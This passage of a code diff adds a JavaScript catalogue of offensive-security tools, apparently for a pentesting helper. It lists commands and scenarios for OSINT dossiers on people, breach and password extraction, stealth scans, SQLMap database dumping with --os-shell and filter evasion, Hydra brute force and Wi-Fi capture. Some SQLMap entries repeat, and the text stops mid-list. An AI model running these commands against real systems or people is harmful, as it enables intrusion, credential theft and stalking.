+                        { command: "sherlock admin --max-threads 5", explanation: "Use 5 concurrent threads for scanning", result: "Balanced scanning with moderate threads" },
+                        { command: "sherlock username123 --max-threads 1", explanation: "Use single thread for scanning", result: "Slow but reliable single-threaded scanning" },
+                        { command: "sherlock john_doe --verbose --print-found --output verbose_found.txt", explanation: "Verbose output with found accounts saved", result: "Detailed results with found accounts exported" },
+                        { command: "sherlock admin --verbose --print-not-found --output verbose_not_found.txt", explanation: "Verbose output with not found results saved", result: "Detailed results with not found platforms exported" },
+                        { command: "sherlock username123 --verbose --print-errors --output verbose_errors.txt", explanation: "Verbose output with errors saved", result: "Detailed results with error information exported" },
+                        { command: "sherlock john_doe --print-found --print-not-found --print-errors", explanation: "Show all types of results", result: "Comprehensive display of all search results" },
+                        { command: "sherlock admin --output comprehensive_results.txt --format json --verbose", explanation: "Comprehensive JSON export with verbose output", result: "Complete search data exported in JSON format" },
+                        { command: "sherlock username123 --output all_results.txt --format txt --print-found --print-not-found --print-errors", explanation: "Complete results export in text format", result: "All search results exported in readable text format" },
+                        { command: "sherlock john_doe --timeout 15 --max-threads 8 --verbose", explanation: "Optimized scanning with 15s timeout and 8 threads", result: "Balanced performance and reliability for scanning" },
+                        { command: "sherlock admin --timeout 20 --max-threads 6 --print-found --output optimized_results.txt", explanation: "Optimized scanning with found accounts export", result: "Efficient scanning with results saved to file" },
+                        { command: "sherlock username123 --timeout 25 --max-threads 4 --print-not-found --output not_found_optimized.txt", explanation: "Optimized scanning with not found export", result: "Efficient scanning with missing accounts saved" },
+                        { command: "sherlock john_doe --timeout 12 --max-threads 10 --print-errors --output errors_optimized.txt", explanation: "Fast scanning with error export", result: "Quick scanning with error details saved" },
+                        { command: "sherlock admin --timeout 18 --max-threads 7 --verbose --output full_scan.txt", explanation: "Full verbose scan with optimized settings", result: "Complete detailed scan with all information exported" }
+                    ]
+                },
+                "Maigret": { 
+                    description: "Collect a dossier on a person by username", 
+                    commands: [
+                        { command: "maigret username123", explanation: "Full username investigation across 300+ sites", result: "Complete dossier across all platforms" },
+                        { command: "maigret --timeout 10 john_doe", explanation: "Search with 10 second timeout", result: "Faster scanning with timeout limits" },
+                        { command: "maigret --print-found admin_user", explanation: "Only show existing accounts", result: "Filters to found accounts only" },
+                        { command: "maigret --output results.txt username123", explanation: "Save results to file", result: "Exports complete dossier to results.txt" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Comprehensive Username Search",
+                            description: "Create complete dossier across 300+ social platforms",
+                            steps: [
+                                "Basic search: maigret username123",
+                                "Timeout search: maigret --timeout 10 john_doe",
+                                "Print found: maigret --print-found admin_user"
+                            ],
+                            expectedResult: "Complete dossier across 300+ sites",
+                            fallbackStrategy: "Check internet connection, try different timeouts, use proxy"
+                        }
+                    ]
+                },
+                "H8mail": { 
+                    description: "Email breach hunting tool", 
+                    commands: [
+                        { command: "h8mail -t target@email.com", explanation: "Check email in breaches", result: "List of breaches containing the email" },
+                        { command: "h8mail -t target@email.com -c config.ini", explanation: "Use configuration file", result: "Enhanced search with custom configuration" },
+                        { command: "h8mail -t target@email.com --api-key your_api_key", explanation: "Use API key for enhanced searches", result: "Accesses premium breach databases with API" },
+                        { command: "h8mail -t admin@company.com --output breaches.txt", explanation: "Save breach results to file", result: "Exports all breach findings to breaches.txt" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Email Breach Check",
+                            description: "Check if email appears in any data breaches",
+                            steps: [
+                                "Basic check: h8mail -t target@email.com",
+                                "Config file: h8mail -t target@email.com -c config.ini",
+                                "API key: h8mail -t target@email.com --api-key your_api_key"
+                            ],
+                            expectedResult: "List of breaches containing the email",
+                            fallbackStrategy: "Check API keys, verify email format, try different breach databases"
+                        }
+                    ]
+                },
+                "Holehe": { 
+                    description: "Check if an email is attached to an account", 
+                    commands: [
+                        { command: "holehe admin@company.com", explanation: "Check admin email across platforms", result: "Shows where admin email has accounts" },
+                        { command: "holehe user@domain.com --only-used", explanation: "Show only used accounts", result: "Filters to active accounts only" },
+                        { command: "holehe test@target.com --output results.txt", explanation: "Save results to file", result: "Results exported to results.txt" }
+                    ]
+                },
+                "TheHarvester": { 
+                    description: "Email, subdomain, and name harvester", 
+                    commands: [
+                        { command: "theHarvester -d company.com -b all", explanation: "Harvest company info from all sources", result: "Comprehensive discovery from multiple sources" },
+                        { command: "theHarvester -d company.com -b google,bing,linkedin", explanation: "Harvest from specific sources", result: "Targeted discovery from Google, Bing, and LinkedIn" },
+                        { command: "theHarvester -d company.com -l 500 -b all", explanation: "Harvest with 500 result limit", result: "Comprehensive discovery with result limit" },
+                        { command: "theHarvester -d target.com -b google", explanation: "Harvest from Google only", result: "Discovers emails, subdomains, and names from Google" },
+                        { command: "theHarvester -d domain.com -b linkedin", explanation: "Harvest from LinkedIn", result: "Professional information and contacts" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Company Domain Enumeration",
+                            description: "Discover company information from multiple sources",
+                            steps: [
+                                "All sources: theHarvester -d company.com -b all",
+                                "Specific sources: theHarvester -d company.com -b google,bing,linkedin",
+                                "With limit: theHarvester -d company.com -l 500 -b all"
+                            ],
+                            expectedResult: "Emails, subdomains, hosts, names",
+                            fallbackStrategy: "Try different search engines, adjust limits, use different sources"
+                        }
+                    ]
+                },
+                "Shodan": { 
+                    description: "Search engine for internet-connected devices", 
+                    commands: [
+                        { command: "shodan search hostname:company.com", explanation: "Search by specific hostname", result: "Devices with specific hostname" },
+                        { command: "shodan search port:22 country:US", explanation: "Search SSH ports in US", result: "SSH servers located in United States" },
+                        { command: "shodan search product:nginx org:company", explanation: "Search Nginx servers by organization", result: "Nginx servers belonging to specific company" }
+                    ]
+                },
+                "Maltego": { 
+                    description: "Interactive data mining tool", 
+                    commands: [
+                        { command: "maltego", explanation: "Launch Maltego application", result: "Opens Maltego GUI for data mining" },
+                        { command: "Right-click > New Domain", explanation: "Create new domain investigation", result: "Starts new domain analysis project" },
+                        { command: "Add domain: company.com", explanation: "Add target domain to investigation", result: "Domain added to investigation workspace" }
+                    ]
+                },
+                "SpiderFoot": { 
+                    description: "Automated OSINT collection tool", 
+                    commands: [
+                        { command: "spiderfoot -s company.com -m all", explanation: "Run all modules against target", result: "Comprehensive OSINT collection from all sources" },
+                        { command: "spiderfoot -s target.com -m sfp_googlesearch", explanation: "Google search module only", result: "Google search results for target domain" },
+                        { command: "spiderfoot -s domain.com -m sfp_whois", explanation: "WHOIS lookup module", result: "WHOIS information for target domain" }
+                    ]
+                },
+                "OSINT Framework": { 
+                    description: "Collection of OSINT tools", 
+                    commands: [
+                        { command: "https://osintframework.com", explanation: "Open OSINT Framework website", result: "Access to comprehensive OSINT tool collection" },
+                        { command: "Navigate to Username section", explanation: "Find username search tools", result: "Lists tools for username enumeration" },
+                        { command: "Use Sherlock tool from framework", explanation: "Access Sherlock through framework", result: "Integrated Sherlock access" }
+                    ]
+                },
+                "Creepy": { 
+                    description: "Geolocation OSINT tool", 
+                    commands: [
+                        { command: "creepy", explanation: "Launch Creepy application", result: "Opens Creepy GUI for geolocation analysis" },
+                        { command: "Add target: @username", explanation: "Add Twitter username to track", result: "Username added for geolocation tracking" },
+                        { command: "Start tracking", explanation: "Begin geolocation monitoring", result: "Starts collecting location data from posts" }
+                    ]
+                },
+                "FOCA": { 
+                    description: "Fingerprinting Organizations with Collected Archives", 
+                    commands: [
+                        { command: "foca", explanation: "Launch FOCA application", result: "Opens FOCA for document metadata analysis" },
+                        { command: "Add domain: company.com", explanation: "Add target domain", result: "Domain added for document discovery" },
+                        { command: "Search documents", explanation: "Find documents from domain", result: "Discovers documents with metadata" }
+                    ]
+                },
+                "ReconDog": { 
+                    description: "All in one tool for information gathering", 
+                    commands: [
+                        { command: "recondog", explanation: "Launch ReconDog tool", result: "Opens ReconDog for comprehensive reconnaissance" },
+                        { command: "Enter target: company.com", explanation: "Set target domain", result: "Target domain configured for scanning" },
+                        { command: "Run all modules", explanation: "Execute complete reconnaissance", result: "Comprehensive information gathering results" }
+                    ]
+                },
+                "Breach-Parse": { 
+                    description: "Tool for parsing breached passwords", 
+                    commands: [
+                        { command: "python3 breach-parse.py company.com email", explanation: "Extract emails from company breach", result: "Lists all emails from company data breach" },
+                        { command: "python3 breach-parse.py target.com password", explanation: "Extract passwords from breach", result: "Lists all passwords from target breach" },
+                        { command: "python3 breach-parse.py domain.com username", explanation: "Extract usernames from breach", result: "Lists all usernames from domain breach" }
+                    ]
+                },
+                "WhatsMyName": { 
+                    description: "Username enumeration on various websites", 
+                    commands: [
+                        { command: "whatsmyname", explanation: "Launch WhatsMyName GUI", result: "Opens username search tool" },
+                        { command: "Enter username: admin", explanation: "Set target username", result: "Username 'admin' configured for search" },
+                        { command: "Select platforms to search", explanation: "Choose websites", result: "Platforms selected for scanning" },
+                        { command: "Click 'Search'", explanation: "Start username search", result: "Begins searching across platforms" }
+                    ]
+                }
+            },
+            "Network Tools": {
+                "Nmap": { 
+                    description: "Network discovery and security auditing tool", 
+                    commands: [
+                        { command: "nmap -sS -T4 -p- 192.168.1.0/24", explanation: "Stealth scan of entire subnet", result: "Discovers open ports across network range" },
+                        { command: "nmap -sS -T4 -p 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080 192.168.1.1", explanation: "Scan common ports on target", result: "Quick discovery of common services" },
+                        { command: "nmap -sS -T4 -A -p 80,443 192.168.1.1", explanation: "Aggressive scan of web ports", result: "Detailed web service analysis" },
+                        { command: "nmap -sV -sC -p 80,443,22,21 192.168.1.1", explanation: "Service version detection", result: "Service versions and default scripts" },
+                        { command: "nmap --script=vuln 192.168.1.1", explanation: "Vulnerability scan", result: "Lists potential vulnerabilities found" },
+                        { command: "nmap --script=default 192.168.1.1", explanation: "Default script scan", result: "Runs common NSE scripts" },
+                        { command: "nmap -sn 192.168.1.0/24", explanation: "Ping scan of subnet", result: "Shows which hosts are online" },
+                        { command: "nmap -sU 192.168.1.1", explanation: "UDP scan", result: "Shows open UDP ports" },
+                        { command: "nmap -oN scan_results.txt 192.168.1.100", explanation: "Save results to file", result: "Results saved in normal format" },
+                        { command: "nmap -oX scan_results.xml 10.0.0.10", explanation: "Save results in XML format", result: "Results saved in XML format for parsing" },
+                        { command: "nmap --script=http-enum 192.168.1.1", explanation: "HTTP enumeration script", result: "Enumerates HTTP services and directories" },
+                        { command: "nmap --script=smb-enum-shares 192.168.1.1", explanation: "SMB shares enumeration", result: "Lists SMB shares on target" },
+                        { command: "nmap --script=snmp-info 192.168.1.1", explanation: "SNMP information gathering", result: "Gathers SNMP system information" },
+                        { command: "nmap -sS -f 192.168.1.1", explanation: "Fragment packets scan", result: "Fragments packets to avoid detection" },
+                        { command: "nmap --script=ssl-enum-ciphers 192.168.1.1 -p 443", explanation: "SSL cipher enumeration", result: "Lists supported SSL/TLS ciphers" },
+                        { command: "nmap --script=mysql-enum 192.168.1.1 -p 3306", explanation: "MySQL enumeration", result: "Enumerates MySQL services and users" },
+                        { command: "nmap --script=ftp-anon 192.168.1.1 -p 21", explanation: "FTP anonymous access check", result: "Checks for anonymous FTP access" },
+                        { command: "nmap --script=dns-zone-transfer -p 53 192.168.1.1", explanation: "DNS zone transfer attempt", result: "Attempts DNS zone transfer" },
+                        { command: "nmap --script=vuln --script-args=unsafe=1 192.168.1.1", explanation: "Unsafe vulnerability scripts", result: "Runs potentially dangerous scripts" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Stealth Network Scan",
+                            description: "Perform stealth reconnaissance of target network",
+                            steps: [
+                                "Subnet scan: nmap -sS -T4 -p- 192.168.1.0/24",
+                                "Common ports: nmap -sS -T4 -p 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080 192.168.1.1",
+                                "Aggressive scan: nmap -sS -T4 -A -p 80,443 192.168.1.1"
+                            ],
+                            expectedResult: "Open ports, services, OS detection",
+                            fallbackStrategy: "Try different scan types, adjust timing, use different ports"
+                        },
+                        {
+                            name: "Service Version Detection",
+                            description: "Identify service versions and run security scripts",
+                            steps: [
+                                "Version scan: nmap -sV -sC -p 80,443,22,21 192.168.1.1",
+                                "Vuln scan: nmap --script=vuln 192.168.1.1",
+                                "Default scripts: nmap --script=default 192.168.1.1"
+                            ],
+                            expectedResult: "Service versions, default scripts output",
+                            fallbackStrategy: "Check firewall rules, try different scripts, adjust scan intensity"
+                        }
+                    ]
+                },
+                "Masscan": { 
+                    description: "Fast port scanner", 
+                    commands: [
+                        { command: "masscan 192.168.1.0/24 -p 80,443", explanation: "Fast scan of web ports on subnet", result: "Quick discovery of web servers" },
+                        { command: "masscan 10.0.0.0/16 -p 22 --rate 10000", explanation: "Fast SSH port scan with high rate", result: "Rapid SSH server discovery" },
+                        { command: "masscan 172.16.0.0/12 -p 21,22,23,25,53,80,110,143,443,993,995,1723,3306,3389,5900,8080", explanation: "Scan common ports on large network", result: "Fast discovery of common services" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Rapid Network Sweep",
+                            description: "Perform fast port discovery across network ranges",
+                            steps: [
+                                "Web ports: masscan 192.168.1.0/24 -p 80,443",
+                                "SSH ports: masscan 10.0.0.0/16 -p 22 --rate 10000",
+                                "Common ports: masscan 172.16.0.0/12 -p 21,22,23,25,53,80,110,143,443,993,995,1723,3306,3389,5900,8080"
+                            ],
+                            expectedResult: "Open ports across network ranges",
+                            fallbackStrategy: "Adjust rate limits, check network permissions, try different ranges"
+                        }
+                    ]
+                },
+                "Netcat": { 
+                    description: "Network utility for reading/writing data", 
+                    commands: [
+                        { command: "nc -zv 192.168.1.1 20-100", explanation: "Scan ports 20-100 on target", result: "Shows which ports are open" },
+                        { command: "nc -l -p 4444", explanation: "Listen on port 4444", result: "Creates listening port for connections" },
+                        { command: "nc -v 192.168.1.100 80", explanation: "Connect to HTTP port", result: "Establishes connection to web server" },
+                        { command: "nc -u 192.168.1.1 53", explanation: "Connect to DNS port (UDP)", result: "UDP connection to DNS server" }
+                    ]
+                },
+                "Wireshark": { 
+                    description: "Network protocol analyzer", 
+                    commands: [
+                        { command: "wireshark", explanation: "Launch Wireshark GUI", result: "Opens Wireshark for packet capture and analysis" },
+                        { command: "tshark -i eth0 -w capture.pcap", explanation: "Capture packets to file", result: "Saves network traffic to capture.pcap" },
+                        { command: "tshark -r capture.pcap -Y 'http.request.method==POST'", explanation: "Filter POST requests from capture", result: "Shows only HTTP POST requests" }
+                    ]
+                }
+            },
+            "Web Application Tools": {
+                "SQLMap": { 
+                    description: "SQL injection automation tool", 
+                    commands: [
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1'", explanation: "Test URL for SQL injection", result: "Automatically detects and exploits SQL injection" },
+                        { command: "sqlmap -u 'http://site.com/login.php' --data='user=admin&pass=test'", explanation: "Test login form for SQL injection", result: "Tests POST parameters for vulnerabilities" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --dbs", explanation: "Enumerate databases", result: "Lists all databases on target" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tables -D database_name", explanation: "List tables in database", result: "Shows all tables in specified database" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --dump -D database_name -T users", explanation: "Dump users table", result: "Extracts all data from users table" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --columns -D database_name -T users", explanation: "List columns in users table", result: "Shows all column names in users table" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --dump -D database_name -T users -C username,password", explanation: "Dump specific columns", result: "Extracts only username and password columns" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --schema", explanation: "Get database schema", result: "Retrieves complete database structure" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --current-db", explanation: "Get current database name", result: "Shows which database is currently selected" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --current-user", explanation: "Get current database user", result: "Shows which database user is being used" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --hostname", explanation: "Get database hostname", result: "Retrieves database server hostname" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --is-dba", explanation: "Check if user is database admin", result: "Determines if current user has admin privileges" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --users", explanation: "Enumerate database users", result: "Lists all database users" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --passwords", explanation: "Extract user passwords", result: "Attempts to extract hashed passwords" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --privileges", explanation: "Enumerate user privileges", result: "Shows privileges for each database user" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --roles", explanation: "Enumerate user roles", result: "Lists database roles and assignments" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --count -D database_name", explanation: "Count records in database", result: "Shows total number of records in database" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --search -C password", explanation: "Search for password columns", result: "Finds all columns containing 'password' in name" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --search -T user", explanation: "Search for user tables", result: "Finds all tables containing 'user' in name" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --search -D admin", explanation: "Search for admin databases", result: "Finds all databases containing 'admin' in name" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --batch", explanation: "Run in batch mode", result: "Automatically answers yes to all prompts" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --random-agent", explanation: "Use random User-Agent", result: "Randomizes HTTP User-Agent header" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --level 5", explanation: "Set injection level to 5", result: "Uses maximum injection techniques" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --risk 3", explanation: "Set risk level to 3", result: "Uses maximum risk injection methods" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique B", explanation: "Use boolean-based injection", result: "Employs boolean-based SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique U", explanation: "Use union-based injection", result: "Employs union-based SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique E", explanation: "Use error-based injection", result: "Employs error-based SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique T", explanation: "Use time-based injection", result: "Employs time-based SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique S", explanation: "Use stacked queries injection", result: "Employs stacked queries SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --technique Q", explanation: "Use inline queries injection", result: "Employs inline queries SQL injection technique" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --union-cols 10", explanation: "Set union columns to 10", result: "Uses 10 columns in UNION queries" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --union-char 'NULL'", explanation: "Set union character to NULL", result: "Uses NULL as filler in UNION queries" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --union-from users", explanation: "Set union from table", result: "Specifies table for UNION queries" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --start 1 --stop 10", explanation: "Limit results to records 1-10", result: "Extracts only records 1 through 10" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --first 5", explanation: "Get first 5 records", result: "Extracts only the first 5 records" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --last 5", explanation: "Get last 5 records", result: "Extracts only the last 5 records" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --where 'id>100'", explanation: "Add WHERE condition", result: "Extracts records where id is greater than 100" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --order-by 'id'", explanation: "Order results by id", result: "Sorts results by id column" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --limit 20", explanation: "Limit results to 20 records", result: "Extracts maximum of 20 records" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --offset 10", explanation: "Skip first 10 records", result: "Starts extraction from record 11" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --threads 10", explanation: "Use 10 concurrent threads", result: "Faster extraction with multiple threads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --time-sec 10", explanation: "Set time delay to 10 seconds", result: "Uses 10 second delays in time-based injection" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --time-sec 5", explanation: "Set time delay to 5 seconds", result: "Uses 5 second delays in time-based injection" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --time-sec 1", explanation: "Set time delay to 1 second", result: "Uses 1 second delays in time-based injection" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --no-cast", explanation: "Disable payload casting", result: "Prevents automatic payload type conversion" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --no-escape", explanation: "Disable payload escaping", result: "Prevents automatic payload escaping" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --prefix ')'", explanation: "Set injection prefix", result: "Uses ')' as injection prefix" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --suffix '#'", explanation: "Set injection suffix", result: "Uses '#' as injection suffix" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2comment", explanation: "Use space2comment tamper script", result: "Converts spaces to comments in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper charencode", explanation: "Use charencode tamper script", result: "URL-encodes payload characters" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper randomcase", explanation: "Use randomcase tamper script", result: "Randomizes case of payload characters" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper unmagicquotes", explanation: "Use unmagicquotes tamper script", result: "Handles magic quotes in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2plus", explanation: "Use space2plus tamper script", result: "Converts spaces to plus signs in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2randomblank", explanation: "Use space2randomblank tamper script", result: "Converts spaces to random blank characters" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2hash", explanation: "Use space2hash tamper script", result: "Converts spaces to hash symbols in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2morehash", explanation: "Use space2morehash tamper script", result: "Converts spaces to multiple hash symbols" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2mysqldash", explanation: "Use space2mysqldash tamper script", result: "Converts spaces to MySQL comment dashes" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2plus", explanation: "Use space2plus tamper script", result: "Converts spaces to plus signs in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2randomblank", explanation: "Use space2randomblank tamper script", result: "Converts spaces to random blank characters" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2hash", explanation: "Use space2hash tamper script", result: "Converts spaces to hash symbols in payloads" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2morehash", explanation: "Use space2morehash tamper script", result: "Converts spaces to multiple hash symbols" },
+                        { command: "sqlmap -u 'http://target.com/page.php?id=1' --tamper space2mysqldash", explanation: "Use space2mysqldash tamper script", result: "Converts spaces to MySQL comment dashes" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Basic SQL Injection Test",
+                            description: "Test for basic SQL injection vulnerabilities",
+                            steps: [
+                                "Test URL: sqlmap -u 'http://target.com/page.php?id=1'",
+                                "Enumerate databases: sqlmap -u 'http://target.com/page.php?id=1' --dbs",
+                                "List tables: sqlmap -u 'http://target.com/page.php?id=1' --tables -D database_name",
+                                "Dump data: sqlmap -u 'http://target.com/page.php?id=1' --dump -D database_name -T users"
+                            ],
+                            expectedResult: "Database names, table names, data extraction",
+                            fallbackStrategy: "Try different injection points, adjust parameters, use different techniques"
+                        },
+                        {
+                            name: "Advanced SQL Injection",
+                            description: "Use advanced techniques for complex targets",
+                            steps: [
+                                "High level: sqlmap -u 'http://target.com/page.php?id=1' --level 5 --risk 3",
+                                "Union technique: sqlmap -u 'http://target.com/page.php?id=1' --technique=U",
+                                "OS shell: sqlmap -u 'http://target.com/page.php?id=1' --os-shell"
+                            ],
+                            expectedResult: "Higher level injection success, OS access",
+                            fallbackStrategy: "Try different techniques, adjust risk levels, manual injection testing"
+                        }
+                    ]
+                },
+                "Nikto": { 
+                    description: "Web server scanner", 
+                    commands: [
+                        { command: "nikto -h http://target.com", explanation: "Scan web server for vulnerabilities", result: "Comprehensive web server security scan" },
+                        { command: "nikto -h http://target.com -p 443", explanation: "Scan HTTPS server", result: "Security scan of encrypted web server" },
+                        { command: "nikto -h http://target.com -ssl", explanation: "Force SSL scan", result: "Enforces SSL/TLS scanning" },
+                        { command: "nikto -h http://target.com -output nikto_results.txt", explanation: "Save results to file", result: "Scan results saved to nikto_results.txt" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "Web Server Vulnerability Scan",
+                            description: "Comprehensive web server security assessment",
+                            steps: [
+                                "Basic scan: nikto -h http://target.com",
+                                "HTTPS scan: nikto -h http://target.com -p 443",
+                                "SSL scan: nikto -h http://target.com -ssl",
+                                "Save results: nikto -h http://target.com -output nikto_results.txt"
+                            ],
+                            expectedResult: "Web vulnerabilities, server information, security headers",
+                            fallbackStrategy: "Check web server status, try different ports, verify URL"
+                        }
+                    ]
+                },
+                "Dirb": { 
+                    description: "Web content scanner", 
+                    commands: [
+                        { command: "dirb http://target.com", explanation: "Basic directory scanning", result: "Discovers directories and files on web server" },
+                        { command: "dirb http://target.com /usr/share/dirb/wordlists/common.txt", explanation: "Use custom wordlist", result: "Custom directory enumeration" },
+                        { command: "dirb http://target.com -X .php,.html", explanation: "Scan specific file extensions", result: "Finds PHP and HTML files" }
+                    ]
+                },
+                "Gobuster": { 
+                    description: "Directory/file brute forcer", 
+                    commands: [
+                        { command: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", explanation: "Directory brute force", result: "Discovers hidden directories" },
+                        { command: "gobuster dns -d target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt", explanation: "Subdomain brute force", result: "Finds subdomains" },
+                        { command: "gobuster vhost -u http://target.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt", explanation: "Virtual host discovery", result: "Discovers virtual hosts" }
+                    ]
+                }
+            },
+            "Password Tools": {
+                "Hydra": { 
+                    description: "Password brute force tool", 
+                    commands: [
+                        { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1", explanation: "SSH brute force with admin username", result: "Attempts to crack SSH password for admin" },
+                        { command: "hydra -L users.txt -P passwords.txt ssh://192.168.1.1", explanation: "SSH brute force with user list", result: "Tests multiple usernames against SSH" },
+                        { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.1", explanation: "SSH brute force with 4 threads", result: "Faster SSH password cracking" },
+                        { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'", explanation: "Web login brute force", result: "Attempts to crack web application login" },
+                        { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/admin/login:user=^USER^&pass=^PASS^:Failed'", explanation: "Admin login brute force", result: "Attempts to crack admin panel login" }
+                    ],
+                    scenarios: [
+                        {
+                            name: "SSH Password Attack",
+                            description: "Brute force SSH passwords on target systems",
+                            steps: [
+                                "Single user: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
+                                "User list: hydra -L users.txt -P passwords.txt ssh://192.168.1.1",
+                                "Multi-threaded: hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.1"
+                            ],
+                            expectedResult: "Successful password combination",
+                            fallbackStrategy: "Try different wordlists, adjust threads, check service status"
+                        },
+                        {
+                            name: "Web Form Attack",
+                            description: "Brute force web application login forms",
+                            steps: [
+                                "Basic form: hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login.php:username=^USER^&password=^PASS^:Invalid'",
+                                "Admin form: hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/admin/login:user=^USER^&pass=^PASS^:Failed'"
+                            ],
+                            expectedResult: "Successful login credentials",
+                            fallbackStrategy: "Check form structure, try different error messages, verify form fields"
+                        }
+                    ]
+                },
+                "John the Ripper": { 
+                    description: "Password cracking tool", 
+                    commands: [
+                        { command: "john hashes.txt", explanation: "Crack password hashes", result: "Attempts to crack stored password hashes" },
+                        { command: "john --wordlist=wordlist.txt hashes.txt", explanation: "Use custom wordlist for cracking", result: "Cracks hashes using specified wordlist" },
+                        { command: "john --format=raw-md5 hash.txt", explanation: "Crack MD5 hashes", result: "Specifically targets MD5 hash format" },
+                        { command: "john --show hashes.txt", explanation: "Show cracked passwords", result: "Displays successfully cracked passwords" }
+                    ]
+                },
+                "Hashcat": { 
+                    description: "Advanced password recovery tool", 
+                    commands: [
+                        { command: "hashcat -m 0 hash.txt wordlist.txt", explanation: "Crack MD5 hashes", result: "Uses GPU acceleration for MD5 cracking" },
+                        { command: "hashcat -m 1000 hash.txt wordlist.txt", explanation: "Crack NTLM hashes", result: "Windows password hash cracking" },
+                        { command: "hashcat -m 1800 hash.txt wordlist.txt", explanation: "Crack SHA512 hashes", result: "SHA512 hash cracking with GPU" }
+                    ]
+                }
+            },
+            "Wireless Tools": {
+                "Aircrack-ng": { 
+                    description: "Wireless network security tool", 
+                    commands: [
+                        { command: "airmon-ng start wlan0", explanation: "Enable monitor mode on wireless interface", result: "Puts wireless card in monitor mode for packet capture" },
+                        { command: "airodump-ng wlan0mon", explanation: "Capture wireless packets", result: "Shows all nearby wireless networks and clients" },
